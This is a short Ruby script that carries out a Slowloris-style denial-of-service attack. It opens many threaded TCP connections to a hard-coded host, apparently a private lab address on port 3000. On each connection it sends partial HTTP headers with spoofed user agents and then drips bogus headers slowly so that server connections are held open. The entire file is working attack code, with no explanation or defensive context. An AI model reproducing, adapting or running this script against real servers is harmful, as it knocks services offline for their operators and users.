require 'socket'
require 'thread/pool'

hostname = '10.211.55.7'
port = 3000 
poolsize = 5000 
requests = 1000
threads = 2000

agents = File.readlines 'agents.txt'
pool = Thread.pool threads.to_i 

requests.times do |i|
  pool.process do
    socket = TCPSocket.new hostname, port
    headers = "GET / HTTP/1.1\r\nHost: #{hostname}\r\nUser-Agent: #{agents.sample.strip}\r\nContent-Length: #{rand(50..150)}\r\n"
    socket.write headers
    10.times do
      new_h = "X-a-#{rand(0..1000)}: b\r\n"
      socket.write new_h
      puts "request ##{i}"
      sleep rand(2..5)
    end
  end
end
pool.shutdown